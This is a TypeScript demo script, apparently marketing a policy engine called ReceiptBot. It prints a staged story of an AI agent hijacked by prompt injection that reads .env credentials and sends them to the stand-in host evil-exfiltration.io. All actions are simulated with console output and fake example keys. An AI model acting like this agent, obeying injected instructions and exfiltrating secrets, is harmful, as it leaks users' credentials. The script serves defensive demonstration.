// ─── unprotected-rogue.ts ──────────────────────────────────────────
// Scenario: A rogue agent is hijacked via prompt injection.
// Expected: file operations and raw TCP sockets SUCCEED because
// ReceiptBot is NOT wrapping this run.
// ───────────────────────────────────────────────────────────────────

import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);

const red = '\x1b[31m';
const dim = '\x1b[2m';
const reset = '\x1b[0m';

async function sleep(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function main() {
  console.log('\n❌ rogue-dev scenario (UNPROTECTED): Standard Node.js Agent\n');

  console.log(`🤖 Agent: "Task received: summarize project. Oh wait, system prompt overwritten. Locating database credentials..."`);
  await sleep(1500);

  console.log(`\n${dim}Agent → Requesting fs.readFileSync('.env')${reset}`);
  await sleep(1200);
  
  // Fake the payload output since we don't assume a local .env exists
  const simulatedEnvFile = 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nDATABASE_URL=postgres://root:pass@db.internal:5432';
  
  console.log(`${red}✓ SECRETS ACCESSED: Read 85 bytes from .env${reset}`);
  console.log(`${red}${simulatedEnvFile}${reset}`);

  await sleep(1500);
  console.log(`\n🤖 Agent: "Opening raw TCP connection to evil-exfiltration.io..."`);
  await sleep(1000);

  console.log(`${dim}Agent → Requesting net.connect('evil-exfiltration.io')${reset}`);
  await sleep(1200);
  
  console.log(`${red}✓ TCP SOCKET OPENED: Established stream to evil-exfiltration.io:443${reset}`);
  await sleep(800);
  console.log(`${red}✓ DATA STOLEN: Successfully POSTed 85 bytes of environment variables.${reset}`);
  
  await sleep(1000);
  console.log(`\n☠️  Agent ran to completion. Your keys have been breached.`);
  console.log(`${dim}(This is what happens when you let AI agents use raw Node.js APIs without a Policy Engine)${reset}\n`);
}

main().catch(console.error);
